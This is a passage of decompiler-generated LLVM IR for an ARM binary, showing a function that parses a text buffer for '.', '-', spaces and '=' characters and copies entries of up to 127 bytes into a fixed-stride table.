  store i32 %v4_9e18, i32* %r0.global-to-local, align 4
  %v1_9e20 = add i32 %v4_9e18, 1
  %v2_9e20 = icmp eq i32 %v4_9e18, -1
  store i1 %v2_9e20, i1* %cpsr_c.global-to-local, align 1
  %v3_9e20 = sub i32 0, %v4_9e18
  %v4_9e20 = and i32 %v1_9e20, %v3_9e20
  %v5_9e20 = icmp slt i32 %v4_9e20, 0
  store i1 %v5_9e20, i1* %cpsr_v.global-to-local, align 1
  %v6_9e20 = icmp slt i32 %v1_9e20, 0
  store i1 %v6_9e20, i1* %cpsr_n.global-to-local, align 1
  %v7_9e20 = icmp eq i32 %v1_9e20, 0
  store i1 %v7_9e20, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9e20, label %dec_label_pc_9ff8, label %dec_label_pc_9e2c

dec_label_pc_9e2c:                                ; preds = %dec_label_pc_9df8
  %v0_9e2c = load i32, i32* @r8, align 4
  %v1_9e2c = add i32 %v0_9e2c, 12
  %v2_9e2c = inttoptr i32 %v1_9e2c to i32*
  %v3_9e2c = load i32, i32* %v2_9e2c, align 4
  store i32 %v3_9e2c, i32* %r3.global-to-local, align 4
  %v1_9e30 = add i32 %v3_9e2c, -4
  %v2_9e30 = icmp ugt i32 %v3_9e2c, 3
  store i1 %v2_9e30, i1* %cpsr_c.global-to-local, align 1
  %v3_9e30 = sub i32 3, %v3_9e2c
  %v4_9e30 = and i32 %v3_9e30, %v3_9e2c
  %v5_9e30 = icmp slt i32 %v4_9e30, 0
  store i1 %v5_9e30, i1* %cpsr_v.global-to-local, align 1
  %v6_9e30 = icmp slt i32 %v1_9e30, 0
  store i1 %v6_9e30, i1* %cpsr_n.global-to-local, align 1
  %v7_9e30 = icmp eq i32 %v3_9e2c, 4
  store i1 %v7_9e30, i1* %cpsr_z.global-to-local, align 1
  %v8_9e34 = icmp sgt i32 %v3_9e2c, 4
  br i1 %v8_9e34, label %dec_label_pc_9ff8, label %dec_label_pc_9e38

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9e2c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v3_9e40 = call i32 @function_1219c(i32 46, i32* null)
  %v0_9e44 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9e44, i32* @r1, align 4
  store i32 %v3_9e40, i32* %r2.global-to-local, align 4
  %v0_9e4c = load i32, i32* @r4, align 4
  store i32 %v0_9e4c, i32* %r0.global-to-local, align 4
  %v3_9e50 = inttoptr i32 %v0_9e4c to i8*
  %v4_9e50 = call i32 @function_13088(i8* %v3_9e50, i32 %v0_9e44, i32 %v3_9e40)
  store i32 %v4_9e50, i32* %r0.global-to-local, align 4
  %v0_9e58 = load i32, i32* @r5, align 4
  %v2_9e58 = add i32 %v0_9e58, %v4_9e50
  store i32 %v2_9e58, i32* @sl, align 4
  store i32 %v2_9418, i32* %r1.global-to-local, align 4
  %v2_9e60 = add i32 %v2_9e58, %v2_9418
  store i32 %v2_9e60, i32* %r3.global-to-local, align 4
  %v1_9e64 = load i32, i32* @r6, align 4
  %v2_9e64 = add i32 %v1_9e64, %v2_9e60
  %v3_9e64 = inttoptr i32 %v2_9e64 to i8*
  %v4_9e64 = load i8, i8* %v3_9e64, align 1
  %v6_9e64 = zext i8 %v4_9e64 to i32
  store i32 %v6_9e64, i32* %r2.global-to-local, align 4
  %v2_9e68 = icmp ugt i8 %v4_9e64, 31
  store i1 %v2_9e68, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9e68 = icmp ult i8 %v4_9e64, 32
  store i1 %v6_9e68, i1* %cpsr_n.global-to-local, align 1
  %v7_9e68 = icmp eq i8 %v4_9e64, 32
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e68, label %bb227, label %bb228

bb227:                                            ; preds = %dec_label_pc_9e38
  %v2_9e6c = add i32 %v4_9e50, 1
  store i32 %v2_9e6c, i32* %r0.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %dec_label_pc_9e38, %bb227
  %v2_9e7c = phi i32 [ %v4_9e50, %dec_label_pc_9e38 ], [ %v2_9e6c, %bb227 ]
  %v1_9e70 = load i32, i32* %fp.global-to-local, align 4
  %v2_9e70 = sub i32 %v1_9e70, %v0_9e58
  store i32 %v2_9e70, i32* %r3.global-to-local, align 4
  %v2_9e74 = sub i32 %v2_9e70, %v2_9e7c
  store i32 %v2_9e74, i32* @r7, align 4
  %v0_9e78 = load i32, i32* @r4, align 4
  %v2_9e78 = add i32 %v0_9e78, %v2_9e7c
  store i32 %v2_9e78, i32* @r6, align 4
  br i1 %v7_9e68, label %bb229, label %bb230

bb229:                                            ; preds = %bb228
  %v3_9e7c = add i32 %v2_9e7c, %v0_9e58
  store i32 %v3_9e7c, i32* @sl, align 4
  br label %bb230

bb230:                                            ; preds = %bb228, %bb229
  store i32 %v2_9e74, i32* %r1.global-to-local, align 4
  store i32 %v2_9e78, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_9e90 = call i32 @function_12df8(i32 %v2_9e78, i32 %v2_9e74, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32 2)
  store i32 %v4_9e90, i32* %r0.global-to-local, align 4
  %v1_9e94 = add i32 %v4_9e90, 1
  %v2_9e94 = icmp eq i32 %v4_9e90, -1
  store i1 %v2_9e94, i1* %cpsr_c.global-to-local, align 1
  %v3_9e94 = sub i32 0, %v4_9e90
  %v4_9e94 = and i32 %v1_9e94, %v3_9e94
  %v5_9e94 = icmp slt i32 %v4_9e94, 0
  store i1 %v5_9e94, i1* %cpsr_v.global-to-local, align 1
  %v6_9e94 = icmp slt i32 %v1_9e94, 0
  store i1 %v6_9e94, i1* %cpsr_n.global-to-local, align 1
  %v7_9e94 = icmp eq i32 %v1_9e94, 0
  store i1 %v7_9e94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9e90, i32* @r4, align 4
  br i1 %v7_9e94, label %dec_label_pc_9f4c, label %dec_label_pc_9ea0

dec_label_pc_9ea0:                                ; preds = %bb230
  store i32 %v2_8f50, i32* %r2.global-to-local, align 4
  %v1_9ea4 = add i32 %v4_9e90, -1
  %v2_9ea4 = icmp ne i32 %v4_9e90, 0
  store i1 %v2_9ea4, i1* %cpsr_c.global-to-local, align 1
  %v3_9ea4 = sub i32 0, %v4_9e90
  %v4_9ea4 = and i32 %v4_9e90, %v3_9ea4
  %v5_9ea4 = icmp slt i32 %v4_9ea4, 0
  store i1 %v5_9ea4, i1* %cpsr_v.global-to-local, align 1
  %v6_9ea4 = icmp slt i32 %v1_9ea4, 0
  store i1 %v6_9ea4, i1* %cpsr_n.global-to-local, align 1
  %v7_9ea4 = icmp eq i32 %v4_9e90, 1
  store i1 %v7_9ea4, i1* %cpsr_z.global-to-local, align 1
  %v7_9ea8 = icmp slt i32 %v4_9e90, 2
  br i1 %v7_9ea8, label %bb232, label %bb231

bb231:                                            ; preds = %dec_label_pc_9ea0
  %v9_9ea8 = add i32 %v4_9e90, -2
  store i32 %v9_9ea8, i32* @r4, align 4
  br label %bb232

bb232:                                            ; preds = %dec_label_pc_9ea0, %bb231
  %v1_9eac = load i32, i32* @sl, align 4
  %v2_9eac = add i32 %v1_9eac, %v2_8f50
  store i32 %v2_9eac, i32* @r5, align 4
  %v0_9eb0 = load i32, i32* @r6, align 4
  store i32 %v0_9eb0, i32* %r0.global-to-local, align 4
  %v0_9eb4 = load i32, i32* @r7, align 4
  store i32 %v0_9eb4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b4.94 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9ec0 = call i32 @function_12df8(i32 %v0_9eb0, i32 %v0_9eb4, i32 ptrtoint (i32* @global_var_136b4.94 to i32), i32 1)
  store i32 %v4_9ec0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9ec4 = icmp slt i32 %v4_9ec0, 0
  store i1 %v1_9ec4, i1* %cpsr_n.global-to-local, align 1
  %v2_9ec4 = icmp eq i32 %v4_9ec0, 0
  store i1 %v2_9ec4, i1* %cpsr_z.global-to-local, align 1
  %tmp233 = icmp slt i32 %v4_9ec0, 1
  br i1 %tmp233, label %.dec_label_pc_9ee4_crit_edge, label %dec_label_pc_9ecc

.dec_label_pc_9ee4_crit_edge:                     ; preds = %bb232
  %v1_9eec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9ee4

dec_label_pc_9ecc:                                ; preds = %bb232
  %v0_9ecc = load i32, i32* @r6, align 4
  store i32 %v0_9ecc, i32* %r0.global-to-local, align 4
  %v0_9ed0 = load i32, i32* @r7, align 4
  store i32 %v0_9ed0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b4.94 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9edc = call i32 @function_12df8(i32 %v0_9ecc, i32 %v0_9ed0, i32 ptrtoint (i32* @global_var_136b4.94 to i32), i32 1)
  store i32 %v4_9edc, i32* %r0.global-to-local, align 4
  %v1_9ee0 = add i32 %v4_9edc, -1
  store i32 %v1_9ee0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9ee4

dec_label_pc_9ee4:                                ; preds = %.dec_label_pc_9ee4_crit_edge, %dec_label_pc_9ecc
  %v1_9eec = phi i32 [ %v1_9eec.pre, %.dec_label_pc_9ee4_crit_edge ], [ %v1_9ee0, %dec_label_pc_9ecc ]
  store i32 %v2_9418, i32* %ip.global-to-local, align 4
  %v1_9ef4 = add i32 %v2_9eec, %v1_9eec
  store i32 %v1_9ef4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v3_9f04 = load i32, i32* @sl, align 4
  %v4_9f04 = add i32 %v3_9f04, %v1_9ef4
  %v5_9f04 = inttoptr i32 %v4_9f04 to i8*
  store i8 0, i8* %v5_9f04, align 1
  %storemerge5.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9f24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9f24

dec_label_pc_9f10:                                ; preds = %dec_label_pc_9f24
  br i1 %v7_9f14, label %dec_label_pc_9f54, label %dec_label_pc_9f1c

dec_label_pc_9f1c:                                ; preds = %dec_label_pc_9f10
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9f24

dec_label_pc_9f24:                                ; preds = %dec_label_pc_9ee4, %dec_label_pc_9f1c
  %v0_9f24 = phi i32 [ %v0_9f10, %dec_label_pc_9f1c ], [ %v0_9f24.pre, %dec_label_pc_9ee4 ]
  %storemerge5 = phi i32 [ %v1_9f38, %dec_label_pc_9f1c ], [ %storemerge5.pre, %dec_label_pc_9ee4 ]
  store i32 %storemerge5, i32* %stack_var_-40, align 4
  store i32 %v0_9f24, i32* %r0.global-to-local, align 4
  %v1_9f28 = inttoptr i32 %v0_9f24 to i8*
  %v2_9f28 = call i32 @function_12d34(i8* %v1_9f28)
  store i32 %v2_9f28, i32* %r0.global-to-local, align 4
  %v3_9f30 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9f30, i32* %r4.global-to-local, align 4
  %v2_9f34 = sub i32 %v2_9f28, %v3_9f30
  %v3_9f34 = icmp uge i32 %v2_9f28, %v3_9f30
  store i1 %v3_9f34, i1* %cpsr_c.global-to-local, align 1
  %v4_9f34 = xor i32 %v3_9f30, %v2_9f28
  %v5_9f34 = xor i32 %v2_9f34, %v2_9f28
  %v6_9f34 = and i32 %v5_9f34, %v4_9f34
  %v7_9f34 = icmp slt i32 %v6_9f34, 0
  store i1 %v7_9f34, i1* %cpsr_v.global-to-local, align 1
  %v8_9f34 = icmp slt i32 %v2_9f34, 0
  store i1 %v8_9f34, i1* %cpsr_n.global-to-local, align 1
  %v9_9f34 = icmp eq i32 %v2_9f28, %v3_9f30
  store i1 %v9_9f34, i1* %cpsr_z.global-to-local, align 1
  %v1_9f38 = add i32 %v3_9f30, 1
  store i32 %v1_9f38, i32* %ip.global-to-local, align 4
  %v8_9f3c = icmp sgt i32 %v2_9f28, %v3_9f30
  %v0_9f10 = load i32, i32* @r5, align 4
  %v2_9f10 = add i32 %v0_9f10, %v3_9f30
  %v3_9f10 = inttoptr i32 %v2_9f10 to i8*
  %v4_9f10 = load i8, i8* %v3_9f10, align 1
  %v6_9f10 = zext i8 %v4_9f10 to i32
  store i32 %v6_9f10, i32* %r3.global-to-local, align 4
  %v2_9f14 = icmp ugt i8 %v4_9f10, 60
  store i1 %v2_9f14, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9f14 = icmp ult i8 %v4_9f10, 61
  store i1 %v6_9f14, i1* %cpsr_n.global-to-local, align 1
  %v7_9f14 = icmp eq i8 %v4_9f10, 61
  store i1 %v7_9f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9f3c, label %dec_label_pc_9f10, label %dec_label_pc_9f40

dec_label_pc_9f40:                                ; preds = %dec_label_pc_9f24
  br i1 %v7_9f14, label %dec_label_pc_9f54, label %dec_label_pc_9f4c

dec_label_pc_9f4c:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_9fbc, %dec_label_pc_9f40, %bb230
  %v0_9f4c = load i32, i32* @sl, align 4
  store i32 %v0_9f4c, i32* @r5, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9f54:                                ; preds = %dec_label_pc_9f10, %dec_label_pc_9f40
  %v0_9f54 = load i32, i32* @r8, align 4
  %v1_9f54 = add i32 %v0_9f54, 12
  %v2_9f54 = inttoptr i32 %v1_9f54 to i32*
  %v3_9f54 = load i32, i32* %v2_9f54, align 4
  store i32 %v3_9f54, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9f60 = icmp slt i32 %v3_9f54, 0
  store i1 %v1_9f60, i1* %cpsr_n.global-to-local, align 1
  %v2_9f60 = icmp eq i32 %v3_9f54, 0
  store i1 %v2_9f60, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp234 = icmp slt i32 %v3_9f54, 1
  br i1 %tmp234, label %dec_label_pc_9fbc, label %dec_label_pc_9f6c

dec_label_pc_9f6c:                                ; preds = %dec_label_pc_9f54
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9f98

dec_label_pc_9f74:                                ; preds = %dec_label_pc_9f98
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v3_9f78 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9f78, i32* %r3.global-to-local, align 4
  %v0_9f7c = load i32, i32* @r8, align 4
  %v1_9f7c = add i32 %v0_9f7c, 12
  %v2_9f7c = inttoptr i32 %v1_9f7c to i32*
  %v3_9f7c = load i32, i32* %v2_9f7c, align 4
  %v1_9f80 = add i32 %v3_9f78, 1
  store i32 %v1_9f80, i32* %ip.global-to-local, align 4
  %v2_9f84 = sub i32 %v3_9f7c, %v1_9f80
  %v3_9f84 = icmp uge i32 %v3_9f7c, %v1_9f80
  store i1 %v3_9f84, i1* %cpsr_c.global-to-local, align 1
  %v4_9f84 = xor i32 %v3_9f7c, %v1_9f80
  %v5_9f84 = xor i32 %v2_9f84, %v3_9f7c
  %v6_9f84 = and i32 %v5_9f84, %v4_9f84
  %v7_9f84 = icmp slt i32 %v6_9f84, 0
  store i1 %v7_9f84, i1* %cpsr_v.global-to-local, align 1
  %v8_9f84 = icmp slt i32 %v2_9f84, 0
  store i1 %v8_9f84, i1* %cpsr_n.global-to-local, align 1
  %v9_9f84 = icmp eq i32 %v3_9f7c, %v1_9f80
  store i1 %v9_9f84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  store i32 %v1_9f80, i32* %r1.global-to-local, align 4
  store i32 %v1_9f80, i32* %stack_var_-40, align 4
  %v7_9f94 = icmp sgt i32 %v3_9f7c, %v1_9f80
  %v0_9fa4.pre = load i32, i32* @r5, align 4
  br i1 %v7_9f94, label %dec_label_pc_9f74.dec_label_pc_9f98_crit_edge, label %dec_label_pc_9fbc

dec_label_pc_9f74.dec_label_pc_9f98_crit_edge:    ; preds = %dec_label_pc_9f74
  %v0_9fa8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f74.dec_label_pc_9f98_crit_edge, %dec_label_pc_9f6c
  %v0_9fa8 = phi i32 [ %v0_9fa8.pre, %dec_label_pc_9f74.dec_label_pc_9f98_crit_edge ], [ %v3_9f30, %dec_label_pc_9f6c ]
  %v0_9fa4 = phi i32 [ %v0_9fa4.pre, %dec_label_pc_9f74.dec_label_pc_9f98_crit_edge ], [ %v0_9f10, %dec_label_pc_9f6c ]
  %v0_9f98 = phi i32 [ %v1_9f80, %dec_label_pc_9f74.dec_label_pc_9f98_crit_edge ], [ 0, %dec_label_pc_9f6c ]
  %v1_9f98 = and i32 %v0_9f98, 33554432
  %v2_9f98 = icmp ne i32 %v1_9f98, 0
  store i1 %v2_9f98, i1* %cpsr_c.global-to-local, align 1
  %v3_9f98 = mul i32 %v0_9f98, 128
  %v1_9f9c = add i32 %v3_9f98, 1472
  %v0_9fa0 = load i32, i32* %sb.global-to-local, align 4
  %v2_9fa0 = add i32 %v1_9f9c, %v0_9fa0
  store i32 %v2_9fa0, i32* %r1.global-to-local, align 4
  store i32 %v0_9fa4, i32* %r0.global-to-local, align 4
  store i32 %v0_9fa8, i32* %r2.global-to-local, align 4
  %v3_9fac = inttoptr i32 %v0_9fa4 to i8*
  %v4_9fac = call i32 @function_13198(i8* %v3_9fac, i32 %v2_9fa0, i32 %v0_9fa8)
  store i32 %v4_9fac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9fb0 = icmp slt i32 %v4_9fac, 0
  store i1 %v1_9fb0, i1* %cpsr_n.global-to-local, align 1
  %v2_9fb0 = icmp eq i32 %v4_9fac, 0
  store i1 %v2_9fb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9fb0, label %dec_label_pc_9f74, label %dec_label_pc_9f4c

dec_label_pc_9fbc:                                ; preds = %dec_label_pc_9f74, %dec_label_pc_9f54
  %v0_9fbc = phi i32 [ %v0_9f10, %dec_label_pc_9f54 ], [ %v0_9fa4.pre, %dec_label_pc_9f74 ]
  store i32 %v0_9fbc, i32* %r0.global-to-local, align 4
  %v1_9fc0 = inttoptr i32 %v0_9fbc to i8*
  %v2_9fc0 = call i32 @function_12d34(i8* %v1_9fc0)
  store i32 %v2_9fc0, i32* %r0.global-to-local, align 4
  %v1_9fc4 = add i32 %v2_9fc0, -127
  %v2_9fc4 = icmp ugt i32 %v2_9fc0, 126
  store i1 %v2_9fc4, i1* %cpsr_c.global-to-local, align 1
  %v3_9fc4 = sub i32 126, %v2_9fc0
  %v4_9fc4 = and i32 %v3_9fc4, %v2_9fc0
  %v5_9fc4 = icmp slt i32 %v4_9fc4, 0
  store i1 %v5_9fc4, i1* %cpsr_v.global-to-local, align 1
  %v6_9fc4 = icmp slt i32 %v1_9fc4, 0
  store i1 %v6_9fc4, i1* %cpsr_n.global-to-local, align 1
  %v7_9fc4 = icmp eq i32 %v2_9fc0, 127
  store i1 %v7_9fc4, i1* %cpsr_z.global-to-local, align 1
  %v8_9fc8 = icmp sgt i32 %v2_9fc0, 127
  br i1 %v8_9fc8, label %dec_label_pc_9f4c, label %dec_label_pc_9fcc

dec_label_pc_9fcc:                                ; preds = %dec_label_pc_9fbc
  %v0_9fcc = load i32, i32* @r8, align 4
  %v1_9fcc = add i32 %v0_9fcc, 12
  %v2_9fcc = inttoptr i32 %v1_9fcc to i32*
  %v3_9fcc = load i32, i32* %v2_9fcc, align 4
  %v1_9fd0 = and i32 %v3_9fcc, 33554432
  %v2_9fd0 = icmp ne i32 %v1_9fd0, 0
  store i1 %v2_9fd0, i1* %cpsr_c.global-to-local, align 1
  %v3_9fd0 = mul i32 %v3_9fcc, 128
  %v1_9fd4 = add i32 %v3_9fd0, 1472
  %v0_9fd8 = load i32, i32* @r5, align 4
  store i32 %v0_9fd8, i32* %r1.global-to-local, align 4
  %v0_9fdc = load i32, i32* %sb.global-to-local, align 4
  %v2_9fdc = add i32 %v1_9fd4, %v0_9fdc
  store i32 %v2_9fdc, i32* @r0, align 4
  %v2_9fe0 = inttoptr i32 %v2_9fdc to i8*
  %v3_9fe0 = call i32 @function_12d5c(i8* %v2_9fe0, i32 %v0_9fd8)
  store i32 %v3_9fe0, i32* %r0.global-to-local, align 4
  %v0_9fe4 = load i32, i32* @r8, align 4
  %v1_9fe4 = add i32 %v0_9fe4, 12
  %v2_9fe4 = inttoptr i32 %v1_9fe4 to i32*
  %v3_9fe4 = load i32, i32* %v2_9fe4, align 4
  %v0_9fe8 = load i32, i32* @sl, align 4
  store i32 %v0_9fe8, i32* @r5, align 4
  %v1_9fec = add i32 %v3_9fe4, 1
  store i32 %v1_9fec, i32* %r3.global-to-local, align 4
  store i32 %v1_9fec, i32* %v2_9fe4, align 4
  %v1_9e04.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9ff8:                                ; preds = %dec_label_pc_9e2c, %dec_label_pc_9df8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_a000 = call i32 @function_1219c(i32 45, i32* null)
  %v0_a004 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a004, i32* @r1, align 4
  store i32 %v3_a000, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_a010 = call i32 @function_13088(i8* %tmp200, i32 %v0_a004, i32 %v3_a000)
  store i32 %v4_a010, i32* %r0.global-to-local, align 4
  %v1_a014 = add i32 %v4_a010, 1
  %v2_a014 = icmp eq i32 %v4_a010, -1
  store i1 %v2_a014, i1* %cpsr_c.global-to-local, align 1
  %v3_a014 = sub i32 0, %v4_a010
  %v4_a014 = and i32 %v1_a014, %v3_a014
  %v5_a014 = icmp slt i32 %v4_a014, 0
  store i1 %v5_a014, i1* %cpsr_v.global-to-local, align 1
  %v6_a014 = icmp slt i32 %v1_a014, 0
  store i1 %v6_a014, i1* %cpsr_n.global-to-local, align 1
  %v7_a014 = icmp eq i32 %v1_a014, 0
  store i1 %v7_a014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a014, label %dec_label_pc_a348, label %dec_label_pc_a01c

dec_label_pc_a01c:                                ; preds = %dec_label_pc_9ff8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_a024 = call i32 @function_1219c(i32 45, i32* null)
  %v0_a028 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a028, i32* @r1, align 4
  store i32 %v3_a024, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_a034 = call i32 @function_13088(i8* %tmp200, i32 %v0_a028, i32 %v3_a024)
  store i32 %v4_a034, i32* %r0.global-to-local, align 4
  store i32 %v2_9418, i32* %ip.global-to-local, align 4
  %v2_a040 = add i32 %v4_a034, %v2_9418
  store i32 %v2_a040, i32* %r3.global-to-local, align 4
  %v1_a044 = load i32, i32* @r6, align 4
  %v2_a044 = add i32 %v1_a044, %v2_a040
  %v3_a044 = inttoptr i32 %v2_a044 to i8*
  %v4_a044 = load i8, i8* %v3_a044, align 1
  store i32 %v2_8f50, i32* %lr.global-to-local, align 4
  %v2_a04c = icmp ugt i8 %v4_a044, 31
  store i1 %v2_a04c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a04c = icmp ult i8 %v4_a044, 32
  store i1 %v6_a04c, i1* %cpsr_n.global-to-local, align 1
  %v7_a04c = icmp eq i8 %v4_a044, 32
  store i1 %v7_a04c, i1* %cpsr_z.global-to-local, align 1
  %v2_a054 = zext i1 %v7_a04c to i32
  %v2_a054.v4_a034 = add i32 %v2_a054, %v4_a034
  store i32 %v2_a054.v4_a034, i32* @r4, align 4
  %v2_a058 = add i32 %v2_a054.v4_a034, %v2_8f50
  store i32 %v2_a058, i32* @r5, align 4
  store i32 %v2_a058, i32* %r0.global-to-local, align 4
  %v1_a060 = load i32, i32* %fp.global-to-local, align 4
  %v2_a060 = sub i32 %v1_a060, %v2_a054.v4_a034
  store i32 %v2_a060, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_a06c = call i32 @function_12df8(i32 %v2_a058, i32 %v2_a060, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32 2)
  store i32 %v4_a06c, i32* %r0.global-to-local, align 4
  %v1_a070 = add i32 %v4_a06c, 1
  %v2_a070 = icmp eq i32 %v4_a06c, -1
  store i1 %v2_a070, i1* %cpsr_c.global-to-local, align 1
  %v3_a070 = sub i32 0, %v4_a06c
  %v4_a070 = and i32 %v1_a070, %v3_a070
  %v5_a070 = icmp slt i32 %v4_a070, 0
  store i1 %v5_a070, i1* %cpsr_v.global-to-local, align 1
  %v6_a070 = icmp slt i32 %v1_a070, 0
  store i1 %v6_a070, i1* %cpsr_n.global-to-local, align 1
  %v7_a070 = icmp eq i32 %v1_a070, 0
  store i1 %v7_a070, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_a06c, i32* %lr.global-to-local, align 4
  br i1 %v7_a070, label %dec_label_pc_a348, label %dec_label_pc_a07c

dec_label_pc_a07c:                                ; preds = %dec_label_pc_a01c
  store i32 %v2_9418, i32* %r1.global-to-local, align 4
  %v1_a084 = add i32 %v4_a06c, -1
  %v2_a084 = icmp ne i32 %v4_a06c, 0
  store i1 %v2_a084, i1* %cpsr_c.global-to-local, align 1
  %v3_a084 = sub i32 0, %v4_a06c
  %v4_a084 = and i32 %v4_a06c, %v3_a084
  %v5_a084 = icmp slt i32 %v4_a084, 0
  store i1 %v5_a084, i1* %cpsr_v.global-to-local, align 1
  %v6_a084 = icmp slt i32 %v1_a084, 0
  store i1 %v6_a084, i1* %cpsr_n.global-to-local, align 1
  %v7_a084 = icmp eq i32 %v4_a06c, 1
  store i1 %v7_a084, i1* %cpsr_z.global-to-local, align 1
  %v1_a088 = load i32, i32* @r4, align 4
  %v2_a088 = add i32 %v1_a088, %v2_9418
  store i32 %v2_a088, i32* %ip.global-to-local, align 4
  %v7_a08c = icmp sgt i32 %v4_a06c, 1
  br i1 %v7_a08c, label %bb235, label %bb236

bb235:                                            ; preds = %dec_label_pc_a07c
  %v9_a08c = add i32 %v4_a06c, -2
  store i32 %v9_a08c, i32* %lr.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %dec_label_pc_a07c, %bb235
  %v3_a0b0 = phi i32 [ %v4_a06c, %dec_label_pc_a07c ], [ %v9_a08c, %bb235 ]
  %v1_a094 = add i32 %v3_a0b0, 1
  store i32 %v1_a094, i32* %r6.global-to-local, align 4
  %v1_a098 = add i32 %v2_a088, -20773
  store i32 %v1_a098, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_a0a0 = load i32, i32* @r5, align 4
  store i32 %v0_a0a0, i32* %r0.global-to-local, align 4
  store i32 %v1_a094, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_136b8.96 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_a0b0 = add i32 %v3_a0b0, %v1_a098
  %v5_a0b0 = inttoptr i32 %v4_a0b0 to i8*
  store i8 0, i8* %v5_a0b0, align 1
  %v5_a0b4 = call i32 @function_12df8(i32 %v0_a0a0, i32 %v1_a094, i32 ptrtoint ([5 x i8]* @global_var_136b8.96 to i32), i32 4)
  store i32 %v5_a0b4, i32* %r0.global-to-local, align 4
  %v1_a0b8 = add i32 %v5_a0b4, -4
  %v2_a0b8 = icmp ugt i32 %v5_a0b4, 3
  store i1 %v2_a0b8, i1* %cpsr_c.global-to-local, align 1
  %v3_a0b8 = sub i32 3, %v5_a0b4
  %v4_a0b8 = and i32 %v3_a0b8, %v5_a0b4
  %v5_a0b8 = icmp slt i32 %v4_a0b8, 0
  store i1 %v5_a0b8, i1* %cpsr_v.global-to-local, align 1
  %v6_a0b8 = icmp slt i32 %v1_a0b8, 0
  store i1 %v6_a0b8, i1* %cpsr_n.global-to-local, align 1
  %v7_a0b8 = icmp eq i32 %v5_a0b4, 4
  store i1 %v7_a0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0b8, label %dec_label_pc_a630, label %dec_label_pc_a0c0

dec_label_pc_a0c0:                                ; preds = %bb236
  store i32 %v2_8f50, i32* %ip.global-to-local, align 4
  %v1_a0c4 = load i32, i32* @r4, align 4
  %v2_a0c4 = add i32 %v1_a0c4, %v2_8f50
  %v3_a0c4 = inttoptr i32 %v2_a0c4 to i8*
